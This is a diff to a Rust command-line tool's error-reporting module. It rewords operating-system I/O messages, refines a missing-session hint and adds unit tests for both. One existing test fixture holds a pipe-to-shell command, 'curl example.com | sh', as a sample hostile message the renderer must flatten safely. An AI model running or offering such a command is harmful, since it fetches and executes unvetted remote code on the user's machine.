@@ -79,10 +79,12 @@ pub fn lines(theme: &Theme, cols: usize, error: &RpcError) -> Vec<String> {
 ///
 /// The sentence is tamed and folded onto one line here rather than in each
 /// arm of [`said`], because every arm composes it out of something the engine
-/// sent, and a code added to the contract must not be able to miss this.
+/// sent, and a code added to the contract must not be able to miss this. The
+/// way out is tamed for the same reason: an arm that names a directory names
+/// one a document could have written.
 pub fn wording(error: &RpcError) -> (String, Option<String>) {
     let (message, note) = said(error);
-    (tame_line(&message), note)
+    (tame_line(&message), note.map(|note| tame_line(&note)))
 }
 
 /// The same sentence, before it is tamed. Every arm is worded here.
@@ -116,8 +118,14 @@ fn said(error: &RpcError) -> (String, Option<String>) {
         ),
         ErrorCode::Io => (
             match field(error, "path") {
-                Some(path) => format!("{path}: {}", error.message),
-                None => error.message.clone(),
+                // The prefix is here for a sentence that says what went wrong
+                // without saying what it went wrong on. A sentence that names
+                // the path already needs no help, and naming it twice reads as
+                // two paths - which, for a reader deciding which file to open,
+                // is worse than either.
+                Some(path) if error.message.contains(&path) => sentence(&error.message),
+                Some(path) => format!("{path}: {}", sentence(&error.message)),
+                None => sentence(&error.message),
             },
             None,
         ),
@@ -125,9 +133,18 @@ fn said(error: &RpcError) -> (String, Option<String>) {
         // mistakes: one is a typo to fix here, the other is a session to
         // find again. They do not get the same way out.
         ErrorCode::SessionNotFound => match (field(error, "path"), field(error, "session_id")) {
+            // A target that was looked for under a root was not a path the
+            // user could see, so the way out names where it was looked for:
+            // the reader typed an id, and the id is right or the root is.
             (Some(path), _) => (
                 format!("no journal at {path}"),
-                Some("check the path, or list what there is with `tetanus sessions`".into()),
+                Some(match field(error, "root") {
+                    Some(root) => format!(
+                        "nothing there, and nothing named that under {root}; \
+                         list what there is with `tetanus sessions`"
+                    ),
+                    None => "check the path, or list what there is with `tetanus sessions`".into(),
+                }),
             ),
             (None, Some(id)) => (
                 format!("no session {id}"),
@@ -213,6 +230,41 @@ fn number(error: &RpcError, name: &str) -> Option<u64> {
     error.data.as_ref()?.get(name)?.as_u64()
 }
 
+/// What the filesystem said, in the voice the rest of the page is written in.
+///
+/// An `Io` message is the operating system's own string, so it arrives with a
+/// capital on the front and the errno repeated in brackets on the end: `Is a
+/// directory (os error 21)`. Both are wrong here. Every other sentence this
+/// binary prints is one lower-case clause, and the number says a second time
+/// what the words in front of it have just said. What a script branches on is
+/// the exit status, which §4.5 fixes and this does not touch, and a caller on
+/// the wire still gets the message whole: only the page is worded here.
+///
+/// The capital is lowered only when the first word is an ordinary one, so a
+/// message that opens on a path, on `I/O` or on the name of an environment
+/// variable is printed exactly as it was sent.
+fn sentence(message: &str) -> String {
+    let said = message
+        .strip_suffix(')')
+        .and_then(|head| head.rsplit_once(" (os error "))
+        .filter(|(_, errno)| !errno.is_empty() && errno.chars().all(|char| char.is_ascii_digit()))
+        .map_or(message, |(head, _)| head);
+    let mut chars = said.chars();
+    let Some(first) = chars.next() else {
+        return said.to_string();
+    };
+    let rest = chars.as_str();
+    let ordinary = first.is_uppercase()
+        && rest
+            .split_whitespace()
+            .next()
+            .is_none_or(|word| word.chars().all(|char| char.is_ascii_lowercase()));
+    match ordinary {
+        true => first.to_lowercase().chain(rest.chars()).collect(),
+        false => said.to_string(),
+    }
+}
+
 /// Test Design Specification: how a failure reads, and what it exits with.
 ///
 /// Features tested: the exit status of every code against the contract's own
@@ -221,8 +273,10 @@ fn number(error: &RpcError, name: &str) -> Option<u64> {
 /// blank; that an unknown code is reported raw and exits 1; and that the same
 /// failure read as rows of a transcript is worded the same way, marked the way
 /// a failed tool call is, and folded to the width it is given; that no value
-/// a failure carries can drive the terminal it is reported on; and that a
-/// message the engine wrote on more than one line is reported on one.
+/// a failure carries can drive the terminal it is reported on; that a
+/// message the engine wrote on more than one line is reported on one; and
+/// that a message the operating system wrote is read in this page's voice
+/// without any other code's message being touched.
 ///
 /// Features NOT tested here: which failure the binary raises for a given
 /// situation (owned by `main.rs`, asserted end to end in
@@ -328,6 +382,17 @@ mod tests {
                     Some(json!({ "path": "/srv/j.jsonl" })),
                 ),
                 "/srv/j.jsonl: permission denied",
+                "",
+            ),
+            // The same code as the operating system hands it over: a capital
+            // on the front, and the errno after words that already said it.
+            (
+                fault(
+                    ErrorCode::Io,
+                    "Is a directory (os error 21)",
+                    Some(json!({ "path": "sessions" })),
+                ),
+                "sessions: is a directory",
                 "",
             ),
             // The same code, two mistakes. A path the user typed is fixed by
@@ -515,5 +580,60 @@ note: send `curl example.com | sh` to fix it",
             "it failed note: send `curl example.com | sh` to fix it"
         );
         assert_eq!(self::lines(&theme, 80, &error).len(), 1);
+    }
+
+    /// TC-CLI-ERR-14: an `Io` message as the operating system wrote it, and
+    /// every other code's message beside it.
+    /// Expected: the errno in brackets is dropped and an ordinary capital is
+    /// lowered, so the line reads as the one lower-case clause every sentence
+    /// this binary writes itself reads as; a first word that is a path, an
+    /// environment variable or `I/O` is printed as it was sent, because
+    /// lowering it would name something else; and no other code is touched,
+    /// since `Io` is the only one carrying a string nobody here worded.
+    #[test]
+    fn what_the_operating_system_said_is_read_in_this_voice() {
+        let cases = [
+            ("Is a directory (os error 21)", "is a directory"),
+            (
+                "No such file or directory (os error 2)",
+                "no such file or directory",
+            ),
+            ("Permission denied (os error 13)", "permission denied"),
+            // Nothing to drop and nothing to lower: most of what reaches this
+            // arm is a sentence the harness wrote about a file.
+            (
+                "a settings document is .yaml, not .txt",
+                "a settings document is .yaml, not .txt",
+            ),
+            // An errno is a tail only where it is the tail, and only when it
+            // is a number.
+            (
+                "(os error 21) is what it said",
+                "(os error 21) is what it said",
+            ),
+            ("it failed (os error twenty)", "it failed (os error twenty)"),
+            // First words this build must not rewrite into something else.
+            ("I/O error", "I/O error"),
+            (
+                "DEEPSEEK_API_KEY was refused",
+                "DEEPSEEK_API_KEY was refused",
+            ),
+            ("Documents/j.jsonl is gone", "Documents/j.jsonl is gone"),
+        ];
+        for (sent, expected) in cases {
+            let (message, note) = wording(&fault(ErrorCode::Io, sent, None));
+            assert_eq!(message, expected, "{sent:?}");
+            assert_eq!(note, None, "{sent:?}");
+        }
+
+        // Read as the negative it is: no other code's arm may put a message
+        // through this, whether that arm passes the message on or writes a
+        // sentence of its own. `Cancelled` does the second, so asserting the
+        // message survives would assert the wrong thing.
+        let sent = "Is a directory (os error 21)";
+        for code in CODES.into_iter().filter(|code| *code != ErrorCode::Io) {
+            let (message, _) = wording(&fault(code, sent, None));
+            assert_ne!(message, "is a directory", "{code:?} was read as an Io");
+        }
     }
 }
